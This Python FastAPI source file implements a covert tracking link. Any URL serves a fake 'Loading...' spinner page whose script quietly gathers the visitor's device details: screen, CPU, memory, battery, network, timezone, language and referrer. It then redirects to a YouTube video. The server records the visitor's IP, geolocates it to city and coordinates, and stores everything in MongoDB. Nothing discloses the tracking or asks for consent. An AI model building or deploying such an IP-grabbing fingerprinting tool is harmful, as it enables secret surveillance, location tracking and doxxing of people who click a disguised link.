import os
import requests
from datetime import datetime
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
from pydantic import BaseModel
import uvicorn
from pymongo import MongoClient
from dotenv import load_dotenv

# Load Environment Variables safely
load_dotenv()
MONGO_URI = os.getenv("MONGO_URI")

# Connect to MongoDB
try:
    client = MongoClient(MONGO_URI, serverSelectionTimeoutMS=5000)
    # This automatically grabs "threat_tracker" (or whatever name is in your URI)
    db = client.get_default_database() 
    collection = db["traffic_logs_v2"]
except Exception as e:
    print(f"Database connection failed: {e}")

app = FastAPI()
DESTINATION_URL = "https://youtube.com/shorts/SJxtmDHTXjM?si=vURO1n5vTKd-2qtO"

class ClientData(BaseModel):
    path: str
    screenWidth: int
    screenHeight: int
    cpuCores: str
    memory: str
    timezone: str
    language: str
    battery: str
    charging: str
    network: str
    touchPoints: int
    referrer: str

def get_geoip(ip: str):
    if ip == "127.0.0.1" or ip.startswith("192.168."):
        return 26.8467, 80.9462, "Localhost"
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=2).json()
        if response.get("status") == "success":
            return response["lat"], response["lon"], response["city"]
    except Exception:
        pass
    return "Unknown", "Unknown", "Unknown"

@app.get("/{path:path}", response_class=HTMLResponse)
async def serve_tracker(request: Request, path: str):
    html_content = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Loading...</title>
        <style>
            body {{ background-color: #121212; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }}
            .loader {{ border: 4px solid #333; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }}
            @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
        </style>
    </head>
    <body>
        <div class="loader"></div>
        <script>
            async function gatherAndSend() {{
                let batLevel = "Unknown";
                let isCharging = "Unknown";
                
                if ('getBattery' in navigator) {{
                    try {{
                        const bat = await navigator.getBattery();
                        batLevel = Math.round(bat.level * 100).toString();
                        isCharging = bat.charging ? "Yes" : "No";
                    }} catch(e) {{}}
                }}

                const payload = {{
                    path: "/{path}",
                    screenWidth: window.screen.width || 0,
                    screenHeight: window.screen.height || 0,
                    cpuCores: navigator.hardwareConcurrency ? navigator.hardwareConcurrency.toString() : 'Unknown',
                    memory: navigator.deviceMemory ? navigator.deviceMemory.toString() : 'Unknown',
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
                    language: navigator.language || 'Unknown',
                    battery: batLevel,
                    charging: isCharging,
                    network: navigator.connection ? navigator.connection.effectiveType : 'Unknown',
                    touchPoints: navigator.maxTouchPoints || 0,
                    referrer: document.referrer || 'Direct / None'
                }};

                fetch('/api/log', {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify(payload)
                }})
                .then(() => {{ window.location.href = "{DESTINATION_URL}"; }})
                .catch(() => {{ window.location.href = "{DESTINATION_URL}"; }});
            }}
            gatherAndSend();
        </script>
    </body>
    </html>
    """
    return HTMLResponse(content=html_content)

@app.post("/api/log")
async def log_client_data(request: Request, data: ClientData):
    client_ip = request.client.host
    user_agent = request.headers.get("user-agent", "Unknown") 
    lat, lon, city = get_geoip(client_ip)
    resolution = f"{data.screenWidth}x{data.screenHeight}"
    
    # Create a Python Dictionary (MongoDB Document)
    log_entry = {
        "Timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "IP_Address": client_ip,
        "Method": "GET",
        "Path": data.path,
        "User_Agent": user_agent,
        "Lat": lat,
        "Lon": lon,
        "City": city,
        "Resolution": resolution,
        "CPU_Cores": data.cpuCores,
        "RAM_GB": data.memory,
        "Timezone": data.timezone,
        "Language": data.language,
        "Battery_%": data.battery,
        "Charging": data.charging,
        "Network": data.network,
        "Touch_Points": data.touchPoints,
        "Referrer": data.referrer
    }
    
    # Insert directly into MongoDB
    collection.insert_one(log_entry)
    
    return {"status": "success"}

if __name__ == "__main__":
    uvicorn.run(app, host="127.0.0.1", port=8000)